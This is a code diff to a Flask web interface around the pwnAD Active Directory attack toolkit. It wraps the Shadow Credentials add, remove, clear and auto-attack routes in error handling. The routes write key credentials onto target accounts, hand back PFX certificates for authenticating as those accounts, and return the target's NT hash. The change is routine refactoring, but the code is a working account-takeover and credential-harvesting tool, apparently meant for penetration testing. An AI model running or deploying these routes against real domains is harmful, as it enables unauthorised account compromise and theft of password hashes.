@@ -97,22 +97,26 @@ def shadow_add():
     if not conn.exists(target):
         return jsonify(success=False, message=f'Target {target} not found')
 
-    target_dn = conn.get_dn_from_samaccountname(target, 'user')
-    result = add_new_key_credential(conn, target_dn, target)
-    if result is None:
-        return jsonify(success=False, message='Failed to add key credential')
+    try:
+        target_dn = conn.get_dn_from_samaccountname(target, 'user')
+        result = add_new_key_credential(conn, target_dn, target)
+        if result is None:
+            return jsonify(success=False, message='Failed to add key credential')
 
-    cert, _, _, device_id = result
-    key, cert_obj = get_key_and_certificate(cert)
-    pfx = create_pfx(key, cert_obj)
+        cert, _, _, device_id = result
+        key, cert_obj = get_key_and_certificate(cert)
+        pfx = create_pfx(key, cert_obj)
 
-    filename = f"{target.rstrip('$')}.pfx"
-    return send_file(
-        BytesIO(pfx),
-        mimetype='application/x-pkcs12',
-        as_attachment=True,
-        download_name=filename,
-    )
+        filename = f"{target.rstrip('$')}.pfx"
+        return send_file(
+            BytesIO(pfx),
+            mimetype='application/x-pkcs12',
+            as_attachment=True,
+            download_name=filename,
+        )
+    except Exception as e:
+        logging.error(f"shadow add error: {e}")
+        return jsonify(success=False, message=str(e))
 
 
 @shadow_bp.route('/shadow/remove', methods=['POST'])
@@ -124,11 +128,15 @@ def shadow_remove():
     if not target or not device_id:
         return jsonify(success=False, message='Missing target or device_id'), 400
 
-    from pwnAD.commands.shadow import remove as shadow_remove_cmd
-    result = shadow_remove_cmd(conn, target, device_id)
-    if result:
-        return jsonify(success=True, message=f'Removed key credential {device_id}')
-    return jsonify(success=False, message='Failed to remove key credential')
+    try:
+        from pwnAD.commands.shadow import remove as shadow_remove_cmd
+        result = shadow_remove_cmd(conn, target, device_id)
+        if result:
+            return jsonify(success=True, message=f'Removed key credential {device_id}')
+        return jsonify(success=False, message='Failed to remove key credential')
+    except Exception as e:
+        logging.error(f"shadow remove error: {e}")
+        return jsonify(success=False, message=str(e))
 
 
 @shadow_bp.route('/shadow/clear', methods=['POST'])
@@ -139,11 +147,15 @@ def shadow_clear():
     if not target:
         return jsonify(success=False, message='Missing target'), 400
 
-    from pwnAD.commands.shadow import clear as shadow_clear_cmd
-    result = shadow_clear_cmd(conn, target)
-    if result:
-        return jsonify(success=True, message=f'Cleared all key credentials for {target}')
-    return jsonify(success=False, message='Failed to clear key credentials')
+    try:
+        from pwnAD.commands.shadow import clear as shadow_clear_cmd
+        result = shadow_clear_cmd(conn, target)
+        if result:
+            return jsonify(success=True, message=f'Cleared all key credentials for {target}')
+        return jsonify(success=False, message='Failed to clear key credentials')
+    except Exception as e:
+        logging.error(f"shadow clear error: {e}")
+        return jsonify(success=False, message=str(e))
 
 
 @shadow_bp.route('/shadow/auto', methods=['POST'])
@@ -154,7 +166,11 @@ def shadow_auto_attack():
     if not target:
         return jsonify(success=False, message='Missing target'), 400
 
-    result = shadow_auto(conn, target)
-    if result and result is not False:
-        return jsonify(success=True, message=f'NT hash for {target}: {result}', nt_hash=result)
-    return jsonify(success=False, message='Shadow credentials auto attack failed')
+    try:
+        result = shadow_auto(conn, target)
+        if result and result is not False:
+            return jsonify(success=True, message=f'NT hash for {target}: {result}', nt_hash=result)
+        return jsonify(success=False, message='Shadow credentials auto attack failed')
+    except Exception as e:
+        logging.error(f"shadow auto error: {e}")
+        return jsonify(success=False, message=str(e))
